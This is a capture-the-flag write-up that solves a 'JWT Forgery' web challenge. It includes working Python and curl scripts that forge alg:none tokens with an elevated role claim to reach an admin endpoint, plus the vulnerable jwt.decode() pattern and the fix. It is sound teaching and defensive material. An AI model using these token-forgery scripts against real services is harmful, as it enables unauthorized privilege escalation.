# JWT Forgery — CTF Writeup

**Category:** Web (JWT — Broken Signature Verification / `alg:none`)
**Points:** 150
**Target:** `http://54.72.82.22:8100`
**Flag:** `safctf{1e4d7bdea93b47c2a813ea5a89f20870}`

---

## 1. Challenge Description

> **JWT Forgery** — 150 pts
> *An old favorite can take on a surprising new shape.*
> Connect to the challenge web service: `http://54.72.82.22:8100`

**Hint interpretation:**

| Phrase | Meaning |
| --- | --- |
| "**JWT** Forgery" | The session token is a JSON Web Token. Attack the claims/signature. |
| "An **old favorite**" | `alg:none` — the original, decade-old JWT bypass. |
| "can take on a **surprising new shape**" | Re-shape the *payload*: flip `role: user` → `role: admin`. |

---

## 2. Recon

### 2.1 Fingerprint

```bash
curl -s -i http://54.72.82.22:8100/
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0.; Path=/; HttpOnly
Content-Type: application/json; charset=utf-8

{"username":"bob","role":"user","message":"no /admin access"}
```

Two things jump out immediately:

1. **Node.js / Express** (`X-Powered-By: Express`) — the `jsonwebtoken` library is the usual suspect.
2. The `auth` cookie is a **JWT**, and it is *already* `alg:none` with an **empty signature**.

That second point is the whole challenge in one line: the server is happy to hand you an unsigned
token. The only question left is whether it *verifies* on the way back in.

### 2.2 Decode the issued token

```python
import base64, json
t = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0."
h, p, _ = t.split(".")
d = lambda s: json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
print(d(h)); print(d(p))
```

```
header : {'alg': 'none', 'typ': 'JWT'}
payload: {'username': 'bob', 'role': 'user'}
```

- `alg: none` → no cryptographic signature is expected.
- `role: user` → that's the claim we want to change.

### 2.3 Map the endpoints

```bash
for p in / /admin /profile /login /flag /jwks.json /.well-known/jwks.json /public.pem; do
  printf "%-24s " "$p"; curl -s -m 8 -o /dev/null -w "%{http_code}\n" "http://54.72.82.22:8100$p"
done
```

| Path | Result |
| --- | --- |
| `/` | 200 — issues the cookie, says *"no /admin access"* |
| **`/admin`** | **401** `{"error":"invalid token"}` (no cookie) |
| `/profile` | 401 `{"error":"invalid token"}` (no cookie) |
| everything else | 404 |

`/admin` is the goal. Note it is **401 invalid token**, not 403 — so the gate is token *parsing*,
not just the role check. Sending the legitimate `bob/user` token there instead gives
**403 `{"error":"not admin"}`** — proof that the server *does* read the payload but doesn't like
the role.

---

## 3. Step 1 — Forge the Token

A JWT is just three base64url segments: `header.payload.signature`. Since the algorithm is `none`,
we can rebuild the first two with whatever claims we like and leave the signature empty:

```python
import base64, json
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()

header  = b64(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
payload = b64(json.dumps({"username":"bob","role":"admin"}, separators=(',',':')).encode())

forged = f"{header}.{payload}."      # note: trailing dot, empty signature
print(forged)
```

Send it to `/admin`:

```bash
curl -s --cookie "auth=<FORGED>" http://54.72.82.22:8100/admin
```

```
{"message":"Welcome, admin!","flag":"safctf{1e4d7bdea93b47c2a813ea5a89f20870}"}
```

### ✅ Flag

```
safctf{1e4d7bdea93b47c2a813ea5a89f20870}
```

---

## 4. Step 2 — Characterise the Bug (how broken is it?)

It's worth nailing down *why* this worked, because "`alg:none` accepted" and "signature never
checked" are different bugs. I threw a matrix of tokens at `/admin` and `/profile`:

| Token | `/admin` | `/profile` |
| --- | --- | --- |
| *(no cookie)* | 401 `invalid token` | 401 `invalid token` |
| `not.a.jwt` (garbage) | 401 `invalid token` | — |
| **2 parts, no signature at all** (`h.p`) | **200 + flag** | 200 |
| 3 parts, empty signature (`h.p.`) | **200 + flag** | 200 |
| `alg:none`, `role:admin`, `sig=x` | **200 + flag** | 200 |
| `alg:None` / `alg:NONE` (case variants) | **200 + flag** | 200 |
| `alg:HS256` + HMAC signed with `"secret"` | **200 + flag** | 200 |
| `alg:HS256` + HMAC signed with `""` | **200 + flag** | 200 |
| `alg:HS256` + HMAC signed with `"jwtsecret"` | **200 + flag** | 200 |
| `alg:RS256` + empty signature | **200 + flag** | 200 |
| `alg:HS512` + garbage | **200 + flag** | 200 |
| original `bob/user` token | **403 `not admin`** | 200 `{"username":"bob","role":"user"}` |

**Conclusion: the signature is never verified at all.**

- Any algorithm is accepted — `none`, `HS256`, `RS256`, `HS512`, wrong secrets.
- Even a **two-part token with no third segment** is accepted, which rules out "it tried to verify
  but the algorithm/key was wrong" and proves the payload is simply base64-decoded and trusted.
- The only thing that changes the outcome is the **`role` claim** — the server's entire
  authorisation decision rests on an attacker-controlled field.

This is the `jsonwebtoken` anti-pattern:

```javascript
// VULNERABLE — decodes and trusts the payload, verifies nothing
const decoded = jwt.decode(token);            // jwt.decode() NEVER verifies the signature
if (!decoded) return res.status(401).json({error:"invalid token"});
if (decoded.role !== "admin") return res.status(403).json({error:"not admin"});
res.json({message:"Welcome, admin!", flag: process.env.FLAG});
```

Note that `jwt.decode()` (as opposed to `jwt.verify()`) performs **no** signature check whatsoever —
it is a parser, not a security control. The 401 for garbage input is just the parse failing; the 403
for `bob/user` is the role check; nothing in between looks at a signature.

---

## 5. Kill Chain Summary

```
GET /                      → Set-Cookie: auth=<JWT alg:none, role:user>
        │  base64url decode each segment
        ▼
header  {"alg":"none","typ":"JWT"}
payload {"username":"bob","role":"user"}     <-- the claim that matters
        │  re-encode with role:admin, leave signature empty
        ▼
forged = base64({"alg":"none"}) . base64({"username":"bob","role":"admin"}) .
        │
        ▼
GET /admin  (Cookie: auth=<forged>)
        │  server: jwt.decode() → no verification → trusts role
        ▼
{"message":"Welcome, admin!","flag":"safctf{1e4d7bdea93b47c2a813ea5a89f20870}"}
```

---

## 6. Full Solve Script

```python
#!/usr/bin/env python3
# JWT Forgery — full solve
import base64, json, urllib.request

B = "http://54.72.82.22:8100"
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()

# 1. take the cookie the server hands out
req = urllib.request.Request(B + "/")
with urllib.request.urlopen(req) as r:
    issued = r.headers["Set-Cookie"].split("auth=")[1].split(";")[0]

# 2. re-shape the payload (the "surprising new shape")
payload = b64(json.dumps({"username": "bob", "role": "admin"},
                         separators=(',', ':')).encode())
header  = b64(json.dumps({"alg": "none", "typ": "JWT"},
                         separators=(',', ':')).encode())
forged  = f"{header}.{payload}."

# 3. present it to /admin
req = urllib.request.Request(B + "/admin")
req.add_header("Cookie", "auth=" + forged)
with urllib.request.urlopen(req) as r:
    print(r.read().decode())
```

**Shell one-liner** (no dependencies beyond `base64`):

```bash
H=$(printf '{"alg":"none","typ":"JWT"}'      | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(printf '{"username":"bob","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s --cookie "auth=$H.$P." http://54.72.82.22:8100/admin
```

> If you prefer tooling, the same result comes from
> [`jwt_tool`](https://github.com/ticarpi/jwt_tool): `python3 jwt_tool.py <token> -X a`
> (the `-X a` "alg:none" exploit), then `-T` to tamper `role` → `admin`.

---

## 7. Tools & Techniques

| Tool | Purpose |
| --- | --- |
| `curl -i` | Spotting the `Set-Cookie: auth=…` JWT on first contact |
| `base64 -d` / `base64.urlsafe_b64decode` | Decoding JWT segments |
| Python `json` + `urllib` | Rebuilding and replaying forged tokens |
| `tr '+/' '-_'` + `tr -d '='` | Producing correct **base64url** (no padding) output |
| Token matrix sweep | Distinguishing "`alg:none` accepted" from "signature never checked" |
| `jwt_tool` | Reference exploitation tool (`-X a`, `-T`) |
| HexStrike MCP / BlackBook MCP | Offensive orchestration + technique grounding |

### Techniques

1. **JWT structure decoding** — splitting `header.payload.signature` and base64url-decoding each part.
2. **`alg:none` attack** — setting `"alg":"none"` and leaving the signature empty.
3. **Claim tampering / privilege escalation** — changing `role: user` → `role: admin`.
4. **Signature-verification negative testing** — deliberately signing with wrong keys and using
   no signature at all to prove verification is absent, not merely weak.
5. **base64url encoding discipline** — JWT uses URL-safe base64 *without* `=` padding; getting this
   wrong is a common source of "why won't it accept my token".

---

## 8. Defender Takeaways

- **Use `jwt.verify()`, never `jwt.decode()`.** `jwt.decode()` does not check signatures — it is a
  parser. This single substitution is the fix for this challenge:

  ```javascript
  const jwt = require('jsonwebtoken');
  let decoded;
  try {
    decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  } catch (e) {
    return res.status(401).json({ error: 'invalid token' });
  }
  if (decoded.role !== 'admin') return res.status(403).json({ error: 'not admin' });
  ```

- **Pin the algorithm explicitly.** Always pass `{ algorithms: ['HS256'] }` (or your single intended
  algorithm). Without it you invite algorithm-confusion attacks (RS256 → HS256) *and* `alg:none`.
  Never allow `"none"` in a production verifier.
- **Reject tokens with a missing or empty signature**; a 2-segment token must never reach a claims
  check.
- **Don't put authorisation decisions in a client-trusted claim.** `role` in a token is fine only
  when the token is cryptographically bound to the user; prefer server-side lookups of the subject
  (`sub`) rather than trusting `role` blindly.
- **Use a strong, random, secret-managed HMAC key** (≥32 bytes) or proper asymmetric keys with a
  published JWKS; rotate them and validate `iss`, `aud`, `exp`, and `nbf`.
- **Start from a secure default:** the token the server *issued* was itself `alg:none` — never mint
  unsigned tokens for real users.
